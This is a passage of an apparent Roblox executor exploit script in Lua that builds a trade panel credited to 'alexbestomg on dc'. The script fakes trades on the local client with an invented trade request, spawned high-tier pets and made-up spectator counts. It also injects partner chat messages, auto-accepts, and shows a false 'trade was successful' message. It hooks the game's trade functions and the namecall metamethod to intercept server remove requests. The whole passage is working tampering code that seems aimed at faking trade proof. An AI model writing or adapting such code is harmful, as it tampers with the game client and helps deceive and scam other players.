    ColorSequenceKeypoint.new(0, PALETTE.panelTop),
    ColorSequenceKeypoint.new(1, PALETTE.panelBottom),
})
panelGradient.Rotation = 90
panelGradient.Parent = controlPanel

local shadow = Instance.new("ImageLabel")
shadow.AnchorPoint            = Vector2.new(0.5, 0.5)
shadow.Position               = UDim2.new(0.5, 0, 0.5, 10)
shadow.Size                   = UDim2.new(1, 46, 1, 46)
shadow.BackgroundTransparency = 1
shadow.Image                  = "rbxassetid://1316045217"
shadow.ImageColor3            = Color3.fromRGB(0, 0, 0)
shadow.ImageTransparency      = 0.45
shadow.ScaleType              = Enum.ScaleType.Slice
shadow.SliceCenter            = Rect.new(10, 10, 118, 118)
shadow.ZIndex                 = 4
shadow.Parent                 = controlPanel

-- ============================================================================
-- Header
-- ============================================================================

local headerFrame = Instance.new("Frame")
headerFrame.Name                   = "Header"
headerFrame.Size                   = UDim2.new(1, 0, 0, 36)
headerFrame.Position               = UDim2.new(0, 0, 0, 0)
headerFrame.BackgroundColor3       = PALETTE.headerTop
headerFrame.BackgroundTransparency = 0
headerFrame.BorderSizePixel        = 0
headerFrame.ZIndex                 = 6
headerFrame.Active                 = true
headerFrame.ClipsDescendants       = false
headerFrame.Parent                 = controlPanel
createUICorner(headerFrame, 14)

local headerGradient = Instance.new("UIGradient")
headerGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, PALETTE.headerTop),
    ColorSequenceKeypoint.new(1, PALETTE.headerBottom),
})
headerGradient.Rotation = 90
headerGradient.Parent = headerFrame

local headerTitle = Instance.new("TextLabel")
headerTitle.Name                   = "HeaderTitle"
headerTitle.AnchorPoint            = Vector2.new(0.5, 0.5)
headerTitle.Position               = UDim2.new(0.5, 0, 0.5, 0)
headerTitle.Size                   = UDim2.new(1, -14, 1, 0)
headerTitle.BackgroundTransparency = 1
headerTitle.Text                   = "alexbestomg on dc"
headerTitle.TextColor3             = Color3.fromRGB(255, 255, 255)
headerTitle.Font                   = Enum.Font.GothamBlack
headerTitle.TextSize               = 16
headerTitle.TextXAlignment         = Enum.TextXAlignment.Center
headerTitle.TextYAlignment         = Enum.TextYAlignment.Center
headerTitle.ZIndex                 = 7
headerTitle.Parent                 = headerFrame

do
    local dragging, dragStart, startPos
    local function beginDrag(input)
        dragging  = true
        dragStart = input.Position
        startPos  = controlPanel.Position
    end
    local function endDrag() dragging = false end
    local function updateDrag(input)
        if not dragging then return end
        local delta = input.Position - dragStart
        local newX  = startPos.X.Offset + delta.X
        local newY  = startPos.Y.Offset + delta.Y
        local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize
            or Vector2.new(1024, 768)
        local panelW = controlPanel.AbsoluteSize.X
        newX = math.clamp(newX, -panelW + 60, vp.X - 60)
        newY = math.clamp(newY, 0, vp.Y - 40)
        controlPanel.Position = UDim2.new(
            startPos.X.Scale, newX,
            startPos.Y.Scale, newY
        )
    end
    headerFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            beginDrag(input)
            if input.UserInputType == Enum.UserInputType.Touch then
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then endDrag() end
                end)
            end
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if not dragging then return end
        if input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch then
            updateDrag(input)
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            endDrag()
        end
    end)
end

-- ============================================================================
-- Content Scroll
-- ============================================================================

local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Name                 = "ContentScroll"
scrollFrame.Size                 = UDim2.new(1, -8, 1, -42)
scrollFrame.Position             = UDim2.new(0, 4, 0, 40)
scrollFrame.BackgroundTransparency = 1
scrollFrame.BorderSizePixel      = 0
scrollFrame.ScrollBarThickness   = 3
scrollFrame.ScrollBarImageColor3 = PALETTE.panelStroke
scrollFrame.ScrollBarImageTransparency = 0.3
scrollFrame.CanvasSize           = UDim2.new(0, 0, 0, 0)
scrollFrame.AutomaticCanvasSize  = Enum.AutomaticSize.Y
scrollFrame.ScrollingDirection   = Enum.ScrollingDirection.Y
scrollFrame.ZIndex               = 8
scrollFrame.Parent               = controlPanel
createUICorner(scrollFrame, 8)

local scrollLayout = Instance.new("UIListLayout")
scrollLayout.SortOrder = Enum.SortOrder.LayoutOrder
scrollLayout.Padding   = UDim.new(0, 6)
scrollLayout.Parent    = scrollFrame

local scrollPad = Instance.new("UIPadding")
scrollPad.PaddingTop    = UDim.new(0, 6)
scrollPad.PaddingBottom = UDim.new(0, 10)
scrollPad.PaddingLeft   = UDim.new(0, 4)
scrollPad.PaddingRight  = UDim.new(0, 6)
scrollPad.Parent        = scrollFrame

-- ============================================================================
-- Builders
-- ============================================================================

local function makeButton(parent, opts)
    local btn = Instance.new("TextButton")
    btn.Name             = opts.name or "Button"
    btn.Size             = opts.size
    btn.Position         = opts.position
    btn.BackgroundColor3 = opts.color
    btn.BorderSizePixel  = 0
    btn.Text             = opts.text
    btn.TextColor3       = PALETTE.text
    btn.Font             = opts.font or Enum.Font.GothamBold
    btn.TextSize         = opts.textSize or 12
    btn.AutoButtonColor  = false
    btn.ZIndex           = 10
    btn.TextYAlignment   = Enum.TextYAlignment.Center
    btn.TextXAlignment   = Enum.TextXAlignment.Center
    btn.Parent           = parent
    createUICorner(btn, opts.radius or 8)
    createUIStroke(btn, Color3.fromRGB(0, 0, 0), 1, 0.55)

    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), {
            BackgroundColor3 = opts.hover or opts.color
        }):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), {
            BackgroundColor3 = opts.color
        }):Play()
    end)
    return btn
end

local function makeSection(parent, titleText, height)
    local section = Instance.new("Frame")
    section.Name             = "Section"
    section.Size             = UDim2.new(1, 0, 0, height)
    section.BackgroundColor3 = PALETTE.section
    section.BorderSizePixel  = 0
    section.ZIndex           = 9
    section.ClipsDescendants = false
    section.Parent           = parent
    createUICorner(section, 10)
    createUIStroke(section, PALETTE.sectionStroke, 1, 0.4)

    local title = Instance.new("TextLabel")
    title.Name             = "Title"
    title.Size             = UDim2.new(1, 0, 0, 22)
    title.BackgroundColor3 = PALETTE.sectionTitle
    title.BorderSizePixel  = 0
    title.Text             = titleText or ""
    title.TextColor3       = PALETTE.text
    title.Font             = Enum.Font.GothamBold
    title.TextSize         = 11
    title.TextScaled       = false
    title.TextWrapped      = false
    title.TextYAlignment   = Enum.TextYAlignment.Center
    title.TextXAlignment   = Enum.TextXAlignment.Center
    title.ZIndex           = 11
    title.ClipsDescendants = false
    title.Parent           = section

    return section, title
end

-- ============================================================================
-- Buttons
-- ============================================================================

local startTradeButton = makeButton(scrollFrame, {
    name = "StartTrade", size = UDim2.new(1, 0, 0, 38),
    position = UDim2.new(0, 0, 0, 0),
    color = PALETTE.green, hover = PALETTE.greenHover, text = "START TRADE",
    font = Enum.Font.GothamBlack, textSize = 14, radius = 10,
})
startTradeButton.LayoutOrder = 1

local addPetButton = makeButton(scrollFrame, {
    name = "AddPet", size = UDim2.new(1, 0, 0, 30),
    position = UDim2.new(0, 0, 0, 0),
    color = PALETTE.orange, hover = PALETTE.orangeHover, text = "ADD PET (HIGH + MID)", textSize = 11,
})
addPetButton.LayoutOrder = 2

local spawnHighTiersButton = makeButton(scrollFrame, {
    name = "SpawnHighTiers", size = UDim2.new(1, 0, 0, 30),
    position = UDim2.new(0, 0, 0, 0),
    color = PALETTE.purple, hover = PALETTE.purpleHover, text = "SPAWN HIGH + MID TIERS", textSize = 11,
})
spawnHighTiersButton.LayoutOrder = 3

local removePetButton = makeButton(scrollFrame, {
    name = "RemovePet", size = UDim2.new(1, 0, 0, 30),
    position = UDim2.new(0, 0, 0, 0),
    color = PALETTE.red, hover = PALETTE.redHover, text = "REMOVE PET", textSize = 11,
})
removePetButton.LayoutOrder = 4

-- ============================================================================
-- Player section
-- ============================================================================

local playerSection, _ = makeSection(scrollFrame, "SELECT PLAYER", 160)
playerSection.LayoutOrder = 5

local playerListFrame = Instance.new("ScrollingFrame")
playerListFrame.Name                 = "PlayerList"
playerListFrame.Size                 = UDim2.new(1, -10, 1, -30)
playerListFrame.Position             = UDim2.new(0, 5, 0, 26)
playerListFrame.BackgroundColor3     = PALETTE.listBg
playerListFrame.BorderSizePixel      = 0
playerListFrame.ScrollBarThickness   = 3
playerListFrame.ScrollBarImageColor3 = PALETTE.panelStroke
playerListFrame.ScrollBarImageTransparency = 0.3
playerListFrame.CanvasSize           = UDim2.new(0, 0, 0, 0)
playerListFrame.ZIndex               = 10
playerListFrame.Parent               = playerSection
createUICorner(playerListFrame, 6)

local playerListLayout = Instance.new("UIListLayout")
playerListLayout.Padding    = UDim.new(0, 3)
playerListLayout.SortOrder  = Enum.SortOrder.LayoutOrder
playerListLayout.Parent     = playerListFrame

-- Username box
local usernameBox = Instance.new("TextBox")
usernameBox.Name              = "UsernameInput"
usernameBox.Size              = UDim2.new(1, 0, 0, 30)
usernameBox.BackgroundColor3  = PALETTE.section
usernameBox.BorderSizePixel   = 0
usernameBox.Text              = selectedPlayerName
usernameBox.PlaceholderText   = "Enter username..."
usernameBox.TextColor3        = PALETTE.text
usernameBox.PlaceholderColor3 = PALETTE.textSoft
usernameBox.Font              = Enum.Font.GothamMedium
usernameBox.TextSize          = 11
usernameBox.TextXAlignment    = Enum.TextXAlignment.Left
usernameBox.ClearTextOnFocus  = false
usernameBox.ZIndex            = 10
usernameBox.LayoutOrder       = 6
usernameBox.Parent            = scrollFrame
createUICorner(usernameBox, 8)
createUIStroke(usernameBox, PALETTE.sectionStroke, 1, 0.4)

local usernameBoxPadding = Instance.new("UIPadding")
usernameBoxPadding.PaddingLeft  = UDim.new(0, 8)
usernameBoxPadding.PaddingRight = UDim.new(0, 8)
usernameBoxPadding.Parent       = usernameBox

local selectPartnerButton = makeButton(scrollFrame, {
    name = "SelectPartner", size = UDim2.new(1, 0, 0, 30),
    position = UDim2.new(0, 0, 0, 0),
    color = PALETTE.blue, hover = PALETTE.blueHover, text = "SELECT TRADE PARTNER", textSize = 11,
})
selectPartnerButton.LayoutOrder = 7

local blockPlayerButton = makeButton(scrollFrame, {
    name = "BlockPlayer", size = UDim2.new(1, 0, 0, 30),
    position = UDim2.new(0, 0, 0, 0),
    color = PALETTE.red, hover = PALETTE.redHover, text = "BLOCK PLAYER", textSize = 11,
})
blockPlayerButton.LayoutOrder = 8

-- ============================================================================
-- Preset section
-- ============================================================================

local presetSection, _ = makeSection(scrollFrame, "PRESET CHATS", 210)
presetSection.LayoutOrder = 9

local presetListFrame = Instance.new("ScrollingFrame")
presetListFrame.Name                 = "PresetList"
presetListFrame.Size                 = UDim2.new(1, -10, 1, -30)
presetListFrame.Position             = UDim2.new(0, 5, 0, 26)
presetListFrame.BackgroundColor3     = PALETTE.listBg
presetListFrame.BorderSizePixel      = 0
presetListFrame.ScrollBarThickness   = 3
presetListFrame.ScrollBarImageColor3 = PALETTE.panelStroke
presetListFrame.ScrollBarImageTransparency = 0.3
presetListFrame.ZIndex               = 10
presetListFrame.Parent               = presetSection
createUICorner(presetListFrame, 6)

local presetListLayout = Instance.new("UIListLayout")
presetListLayout.Padding = UDim.new(0, 3)
presetListLayout.Parent  = presetListFrame

local function updatePresetCanvas()
    presetListFrame.CanvasSize = UDim2.new(0, 0, 0, presetListLayout.AbsoluteContentSize.Y)
end
presetListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updatePresetCanvas)

-- ============================================================================
-- Preset chats
-- ============================================================================

local function sendPartnerQuickChat(message)
    if not TradeApp then return end
    local partner = TradeApp:_get_partner()
    if not partner then
        print("No trade partner found. Start a trade first.")
        return
    end
    local ok, err = pcall(function()
        TradeApp:_render_message_in_trade_chat(partner, message, nil, nil, true)
    end)
    if not ok then print("Failed to render partner quick chat:", err) end
end

for _, preset in ipairs(PARTNER_PRESET_CHATS) do
    local btn = Instance.new("TextButton")
    btn.Name             = "Preset_" .. preset.Label:gsub("%s+", "_"):gsub("[^%w_]", "")
    btn.Size             = UDim2.new(1, 0, 0, 28)
    btn.BackgroundColor3 = PALETTE.button
    btn.BorderSizePixel  = 0
    btn.Text             = preset.Label
    btn.TextColor3       = PALETTE.text
    btn.Font             = Enum.Font.GothamMedium
    btn.TextSize         = 11
    btn.TextWrapped      = true
    btn.TextYAlignment   = Enum.TextYAlignment.Center
    btn.AutoButtonColor  = false
    btn.ZIndex           = 12
    btn.Parent           = presetListFrame
    createUICorner(btn, 6)
    btn.MouseButton1Click:Connect(function()
        sendPartnerQuickChat(preset.Message)
    end)
    btn.MouseEnter:Connect(function() btn.BackgroundColor3 = PALETTE.buttonHover end)
    btn.MouseLeave:Connect(function() btn.BackgroundColor3 = PALETTE.button end)
end

updatePresetCanvas()

-- ============================================================================
-- Player list
-- ============================================================================

local function resolveUsernameToId(name)
    name = name:gsub("^%s+", ""):gsub("%s+$", "")
    if name == "" then return nil end
    local player = Players:FindFirstChild(name)
    if player then return player.UserId end
    for _, custom in ipairs(CUSTOM_PLAYERS) do
        local display = custom.displayName or custom.Name
        if display:lower() == name:lower() then
            return custom.userId or custom.UserId
        end
    end
    return nil
end

local function resolveUsernameToPlayer(name)
    name = name:gsub("^%s+", ""):gsub("%s+$", "")
    if name == "" then return nil end
    local player = Players:FindFirstChild(name)
    if player then return player end
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower() == name:lower() then return p end
    end
    return nil
end

local function applySelectedPlayer(name, userId)
    selectedPlayerName = name
    selectedPlayerId   = userId
    usernameBox.Text   = name
end

local function populatePlayerList()
    for _, child in ipairs(playerListFrame:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end
    local realNames = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then realNames[p.Name:lower()] = true end
    end
    local layoutOrder = 0
    local function makeRow(name, uid, color)
        layoutOrder = layoutOrder + 1
        local btn = Instance.new("TextButton")
        btn.Name             = "P_" .. tostring(uid)
        btn.Size             = UDim2.new(1, 0, 0, 26)
        btn.BackgroundColor3 = color
        btn.BorderSizePixel  = 0
        btn.Text             = name
        btn.TextColor3       = PALETTE.text
        btn.Font             = Enum.Font.GothamMedium
        btn.TextSize         = 11
        btn.TextWrapped      = true
        btn.TextYAlignment   = Enum.TextYAlignment.Center
        btn.AutoButtonColor  = false
        btn.ZIndex           = 12
        btn.LayoutOrder      = layoutOrder
        btn.Parent           = playerListFrame
        createUICorner(btn, 6)
        btn.MouseButton1Click:Connect(function()
            applySelectedPlayer(name, uid)
        end)
        btn.MouseEnter:Connect(function()
            btn.BackgroundColor3 = color:Lerp(Color3.new(1,1,1), 0.25)
        end)
        btn.MouseLeave:Connect(function()
            btn.BackgroundColor3 = color
        end)
        return btn
    end
    local fakeList = {}
    for _, custom in ipairs(CUSTOM_PLAYERS) do
        local display = custom.displayName or custom.Name
        local uid     = custom.userId      or custom.UserId
        if not realNames[display:lower()] then
            table.insert(fakeList, { name = display, uid = uid })
        end
    end
    table.sort(fakeList, function(a,b) return a.name:lower() < b.name:lower() end)
    for _, row in ipairs(fakeList) do
        makeRow(row.name, row.uid, COLOR_FAKE)
    end
    local realList = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then table.insert(realList, p) end
    end
    table.sort(realList, function(a,b) return a.Name:lower() < b.Name:lower() end)
    for _, p in ipairs(realList) do
        makeRow(p.Name, p.UserId, COLOR_REAL)
    end
    playerListFrame.CanvasSize = UDim2.new(0, 0, 0, playerListLayout.AbsoluteContentSize.Y)
end

-- ============================================================================
-- Add / Remove pet actions
-- ============================================================================

local function addPetToTrade()
    if not is_mock_trade_active() then
        print("No active mock trade found! Start a trade first.")
        return
    end
    local pool = {}
    for _, n in ipairs(highTierPets) do table.insert(pool, n) end
    for _, n in ipairs(midTierPets)  do table.insert(pool, n) end

    local randomPetName = pool[math.random(1, #pool)]
    local randomVariant = PARTNER_ADD_VARIANTS[math.random(1, #PARTNER_ADD_VARIANTS)]

    if addPetToPartnerSide(randomPetName, randomVariant) then
        print("Partner added " .. randomVariant .. " " .. randomPetName .. " to their offer!")
    else
        print("Partner could not add a pet (offer might be full).")
    end
end

local function removePetFromTrade()
    if not is_mock_trade_active() then
        print("No active mock trade found! Start a trade first.")
        return
    end
    local state = TradeApp:_get_local_trade_state()
    if not state then return end
    local partner_key = (state.recipient == LocalPlayer) and "sender_offer" or "recipient_offer"
    local partner_offer = state[partner_key]
    if not partner_offer then return end
    local items = partner_offer.items or {}
    if #items <= 0 then
        print("No pets to remove from partner's offer!")
        return
    end
    local new_items = {}
    for i = 1, #items - 1 do new_items[i] = items[i] end
    local removedPet = items[#items]
    local new_state = table.clone(state)
    new_state[partner_key] = table.clone(partner_offer)
    new_state[partner_key].items = new_items
    TradeApp:_overwrite_local_trade_state(new_state)
    TradeApp:refresh_all()
    TradeApp:_lock_trade_for_appropriate_time()
    local partnerName   = partner_offer.player_name or selectedPlayerName
    local rarityLabel   = getPetRarityLabel(removedPet.properties or {})
    local formattedName = formatPetName(removedPet.kind or removedPet.name or "unknown")
    pcall(function()
        TradeApp:_render_message_in_trade_chat(
            nil,
            partnerName .. " removed " .. rarityLabel .. " " .. formattedName,
            true, true
        )
    end)
end

-- ============================================================================
-- Spectator auto-shuffle
-- ============================================================================

local spectator_shuffle_thread = nil
local function stop_spectator_shuffle()
    if spectator_shuffle_thread then
        pcall(task.cancel, spectator_shuffle_thread)
        spectator_shuffle_thread = nil
    end
end
local function start_spectator_shuffle()
    stop_spectator_shuffle()
    spectator_shuffle_thread = task.spawn(function()
        local current = math.random(1, 5)
        spectatorCount = current
        while is_mock_trade_active() do
            pcall(function()
                TradeApp:_change_local_trade_state({ subscriber_count = current })
                TradeApp:refresh_all()
            end)
            task.wait(SPECTATOR_SHUFFLE_INTERVAL)
            if not is_mock_trade_active() then break end
            local newNum
            repeat newNum = math.random(1, 5) until newNum ~= current
            current = newNum
            spectatorCount = current
        end
        spectator_shuffle_thread = nil
    end)
end

-- ============================================================================
-- Trade flow
-- ============================================================================

local function initiateTrade()
    local targetPlayer = {
        Name        = selectedPlayerName,
        UserId      = selectedPlayerId,
        DisplayName = selectedPlayerName
    }

    local response = Fsys.load("UIManager").apps.DialogApp:dialog({
        text  = string.format("%s sent you a trade request", targetPlayer.Name),
        left  = "Decline",
        right = "Accept"
    })
    if response ~= "Accept" then
        print("Trade declined!")
        return
    end

    local uiManager = Fsys.load("UIManager")
    local tradeApp  = uiManager.apps.TradeApp
    if not tradeApp then
        print("TradeApp not found")
        return
    end

    local randomSpectators = math.random(1, 5)
    spectatorCount = randomSpectators

    local tradeState = {
        trade_id                    = "visual_trade_" .. math.random(10000, 99999),
        sender                      = targetPlayer,
        recipient                   = LocalPlayer,
        sender_offer                = { items = {}, negotiated = false, confirmed = false, player_name = targetPlayer.Name },
        recipient_offer             = { items = {}, negotiated = false, confirmed = false, player_name = LocalPlayer.Name },
        current_stage               = "negotiation",
        offer_version               = 1,
        sender_has_trade_license    = true,
        recipient_has_trade_license = true,
        busy_indicators             = {},
        subscriber_count            = randomSpectators
    }

    tradeApp:_overwrite_local_trade_state(tradeState)
    uiManager.set_app_visibility("TradeApp", true)
    wait(0.5)
    tradeApp:refresh_all()
    start_spectator_shuffle()

    if not tradeApp._mock_originals then
        tradeApp._mock_originals = {
            accept      = tradeApp._on_accept_pressed,
            confirm     = tradeApp._on_confirm_pressed,
            remove_item = tradeApp._remove_item_from_my_offer,
        }
    end
    local originals = tradeApp._mock_originals

    local function restore_originals()
        if tradeApp._mock_timeout_thread then
            pcall(task.cancel, tradeApp._mock_timeout_thread)
            tradeApp._mock_timeout_thread = nil
        end
        stop_spectator_shuffle()
        tradeApp._on_accept_pressed         = originals.accept
        tradeApp._on_confirm_pressed        = originals.confirm
        tradeApp._remove_item_from_my_offer = originals.remove_item
    end

    local function restart_mock_timeout()
        if tradeApp._mock_timeout_thread then
            pcall(task.cancel, tradeApp._mock_timeout_thread)
            tradeApp._mock_timeout_thread = nil
        end
        tradeApp._mock_timeout_thread = task.delay(TRADE_TIMEOUT_DURATION, function()
            local state = tradeApp:_get_local_trade_state()
            if not is_mock_trade_state(state) then return end
            local both_confirmed =
                state.sender_offer and state.sender_offer.confirmed and
                state.recipient_offer and state.recipient_offer.confirmed
            if both_confirmed then return end
            print("Mock trade timeout - restoring original methods")
            restore_originals()
        end)
    end
    restart_mock_timeout()

    local function localRemovePartnerItemByUnique(unique)
        local fresh_state = tradeApp:_get_local_trade_state()
        if not fresh_state then return nil end
        local pkey = (fresh_state.recipient == LocalPlayer) and "sender_offer" or "recipient_offer"
        local p_offer = fresh_state[pkey]
        if not p_offer then return nil end
        local p_items = p_offer.items or {}
        local removedPet = nil
        local new_items = {}
        for _, it in ipairs(p_items) do
            if it.unique == unique then
                removedPet = it
            else
                table.insert(new_items, it)
            end
        end
        if not removedPet then return nil end
        local new_state = table.clone(fresh_state)
        new_state[pkey] = table.clone(p_offer)
        new_state[pkey].items = new_items
        tradeApp:_overwrite_local_trade_state(new_state)
        tradeApp:_lock_trade_for_appropriate_time()
        tradeApp:refresh_all()
        return removedPet, p_offer
    end

    local function schedulePartnerRemoval(item, partnerPlayerName)
        if not item or not item.unique then return end
        local unique = item.unique
        local pet_kind = item.kind or item.name or "unknown"
        local partner_name = partnerPlayerName or selectedPlayerName or "Partner"

        pcall(function()
            local display = pet_kind
            local kd = InventoryDB.pets and InventoryDB.pets[pet_kind]
            if kd and kd.name then display = kd.name end
            tradeApp:_render_message_in_trade_chat(
                nil,
                "You requested " .. partner_name .. " to remove " .. display,
                false
            )
        end)

        task.spawn(function()
            task.wait(PARTNER_REMOVE_DELAY)
            if not is_mock_trade_active() then return end
            localRemovePartnerItemByUnique(unique)
        end)
    end

    local hooked_names = {
        "_remove_item_from_my_offer",
        "_remove_item_from_partner_offer",
        "_on_remove_pressed",
        "_on_remove_item_pressed",
        "_request_remove_item",
        "_request_remove_partner_item",
        "_try_remove_item",
        "_remove_item",
        "_suggest_remove_item",
        "_on_suggest_remove_pressed",
    }
    tradeApp._mock_hooked = tradeApp._mock_hooked or {}
    for _, name in ipairs(hooked_names) do
        local fn = tradeApp[name]
        if type(fn) == "function" and not tradeApp._mock_hooked[name] then
            tradeApp._mock_hooked[name] = fn
            tradeApp[name] = function(self, item, ...)
                if not is_mock_trade_state(self:_get_local_trade_state()) then
                    return fn(self, item, ...)
                end
                if not item or not item.unique then
                    return fn(self, item, ...)
                end
                local state = self:_get_local_trade_state()
                if not state then return fn(self, item, ...) end

                local my_key = (state.recipient == LocalPlayer) and "recipient_offer" or "sender_offer"
                local p_key  = (state.recipient == LocalPlayer) and "sender_offer"    or "recipient_offer"
                local my_items = (state[my_key] and state[my_key].items) or {}
                local p_items  = (state[p_key]  and state[p_key].items)  or {}

                local in_mine, in_partner = false, false
                for _, it in ipairs(my_items) do if it.unique == item.unique then in_mine = true; break end end
                for _, it in ipairs(p_items)  do if it.unique == item.unique then in_partner = true; break end end

                if in_mine then
                    local new_items = {}
                    for _, it in ipairs(my_items) do
                        if it.unique ~= item.unique then table.insert(new_items, it) end
                    end
                    self:_change_local_trade_state({
                        [my_key] = {
                            items = new_items,
                            negotiated  = state[my_key].negotiated,
                            confirmed   = state[my_key].confirmed,
                            player_name = state[my_key].player_name,
                        }
                    })
                    pcall(function() self:_lock_trade_for_appropriate_time() end)
                    self:refresh_all()
                    pcall(function()
                        local disp = (InventoryDB.pets[item.kind] and InventoryDB.pets[item.kind].name) or item.kind or "item"
                        self:_render_message_in_trade_chat(
                            nil,
                            LocalPlayer.Name .. " removed " .. disp,
                            false, true
                        )
                    end)
                    return
                end

                if in_partner then
                    schedulePartnerRemoval(item, state[p_key] and state[p_key].player_name or selectedPlayerName)
                    return
                end

                return fn(self, item, ...)
            end
        end
    end

    do
        local DialogApp = Fsys.load("UIManager").apps.DialogApp
        if DialogApp and DialogApp.dialog and not tradeApp._mock_remove_dialog_hooked then
            tradeApp._mock_remove_dialog_hooked = true
            local origDialog = DialogApp.dialog
            DialogApp.dialog = function(self, data, ...)
                if is_mock_trade_state(TradeApp:_get_local_trade_state()) and data and type(data.text) == "string" then
                    local t = data.text
                    if t:find("Request removal of") or t:find("request removal")
                        or t:find("Remove this item") or t:find("Ask ") then
                        return "Yes"
                    end
                end
                return origDialog(self, data, ...)
            end
        end
    end

    do
        local RouterClient = Fsys.load("RouterClient")
        local suggestRemoveEvent = RouterClient.get_event and RouterClient.get_event("TradeAPI/SuggestRemoveItem")
        if suggestRemoveEvent then
            local mt = getrawmetatable(suggestRemoveEvent)
            if mt then
                local oldNamecall = mt.__namecall
                pcall(setreadonly, mt, false)
                mt.__namecall = function(self, ...)
                    if self == suggestRemoveEvent and getnamecallmethod() == "FireServer" then
                        local uniqueId = select(1, ...)
                        if is_mock_trade_active() then
                            local st = tradeApp:_get_local_trade_state()
                            if st then
                                local pk = (st.recipient == LocalPlayer) and "sender_offer" or "recipient_offer"
                                local item
                                for _, it in ipairs(st[pk].items or {}) do
                                    if it.unique == uniqueId then item = it; break end
                                end
                                if item then
                                    schedulePartnerRemoval(item, st[pk] and st[pk].player_name or selectedPlayerName)
                                    return
                                end
                            end
                        end
                    end
                    return oldNamecall(self, ...)
                end
                pcall(setreadonly, mt, true)
            end
        end
    end

    function tradeApp._on_accept_pressed(self)
        if not is_mock_trade_state(self:_get_local_trade_state()) then
            return originals.accept(self)
        end
        local state = self:_get_local_trade_state()
        if not state then return end
        local current_version = tonumber(state.offer_version) or 1

        self:_change_local_trade_state({
            recipient_offer = {
                items = state.recipient_offer.items,
                negotiated = true, confirmed = false, player_name = LocalPlayer.Name
            }
        })
        self:refresh_all()
        restart_mock_timeout()
        wait(AUTO_ACCEPT_DELAY)

        self:_change_local_trade_state({
            sender_offer = {
                items = state.sender_offer.items,
                negotiated = true, confirmed = false, player_name = targetPlayer.Name
            },
            current_stage    = "confirmation",
            offer_version    = current_version + 1,
            subscriber_count = spectatorCount
        })
        self:refresh_all()

        function self._on_confirm_pressed(inner_self)
            if not is_mock_trade_state(inner_self:_get_local_trade_state()) then
                return originals.confirm(inner_self)
            end
            local confirmState = inner_self:_get_local_trade_state()
            if not confirmState then return end

            inner_self:_change_local_trade_state({
                recipient_offer = {
                    items = confirmState.recipient_offer.items,
                    negotiated = true, confirmed = true, player_name = LocalPlayer.Name
                }
            })
            inner_self:refresh_all()
            wait(AUTO_ACCEPT_DELAY)

            inner_self:_change_local_trade_state({
                sender_offer = {
                    items = confirmState.sender_offer.items,
                    negotiated = true, confirmed = true, player_name = targetPlayer.Name
                },
                subscriber_count = spectatorCount
            })
            inner_self:refresh_all()
            wait(AUTO_ACCEPT_DELAY)

            if inner_self._mock_timeout_thread then
                pcall(task.cancel, inner_self._mock_timeout_thread)
                inner_self._mock_timeout_thread = nil
            end
            stop_spectator_shuffle()

            pcall(function()
                if inner_self.frame and inner_self.frame.Parent then
                    inner_self.frame:Destroy()
                end
                inner_self:hide()
                inner_self:_overwrite_local_trade_state(nil)
                inner_self._on_accept_pressed         = originals.accept
                inner_self._on_confirm_pressed        = originals.confirm
                inner_self._remove_item_from_my_offer = originals.remove_item
            end)

            Fsys.load("UIManager").apps.HintApp:hint({
                text = "The trade was successful!",
                length = 3,
                overridable = true
            })
        end
    end
end

-- ============================================================================
-- Connections
-- ============================================================================

addPetButton.MouseButton1Click:Connect(addPetToTrade)
spawnHighTiersButton.MouseButton1Click:Connect(spawnAllPets)
removePetButton.MouseButton1Click:Connect(removePetFromTrade)
startTradeButton.MouseButton1Click:Connect(initiateTrade)

usernameBox.FocusLost:Connect(function()
    local typed = usernameBox.Text:gsub("^%s+", ""):gsub("%s+$", "")
    if typed == "" then
        usernameBox.Text = selectedPlayerName
        return
    end
    local resolvedId = resolveUsernameToId(typed)
    selectedPlayerName = typed
    if resolvedId then selectedPlayerId = resolvedId end
end)

selectPartnerButton.MouseButton1Click:Connect(function()
    local state = TradeApp:_get_local_trade_state()
    if not state then
        print("No active trade found! Start a trade first.")
        return
    end
    local partnerName, partnerId
    if state.sender and state.sender.Name ~= LocalPlayer.Name then
        partnerName, partnerId = state.sender.Name, state.sender.UserId
    elseif state.recipient and state.recipient.Name ~= LocalPlayer.Name then
        partnerName, partnerId = state.recipient.Name, state.recipient.UserId
    end
    if not partnerName then return end
    selectedPlayerName = partnerName
    selectedPlayerId   = partnerId or resolveUsernameToId(partnerName) or selectedPlayerId
    usernameBox.Text   = selectedPlayerName
end)

blockPlayerButton.MouseButton1Click:Connect(function()
    local name = usernameBox.Text:gsub("^%s+", ""):gsub("%s+$", "")
    if name == "" then
        print("Block failed: no username in the textbox.")
        return
    end
    local targetPlayer = resolveUsernameToPlayer(name)
    if not targetPlayer then
        print("Block failed: '" .. name .. "' is not in the current server.")
        return
    end
    if targetPlayer == LocalPlayer then
        print("Block failed: cannot block yourself.")
        return
    end
    local ok, err = pcall(BlockPlayer, targetPlayer)
    if not ok then
        print("BlockPlayer errored:", err)
    else
        print("Successfully blocked " .. targetPlayer.Name)
    end
end)

-- ============================================================================
-- Init
-- ============================================================================

populatePlayerList()

Players.PlayerAdded:Connect(function() populatePlayerList() end)
Players.PlayerRemoving:Connect(function() populatePlayerList() end)

print("COMPACT Trade UI created!")
print("High tier: " .. #highTierPets .. " | Mid tier: " .. #midTierPets)
print("ADD PET adds random High/Mid tier pet in random variant (10 variants).")

local playerGui = LocalPlayer:WaitForChild("PlayerGui")
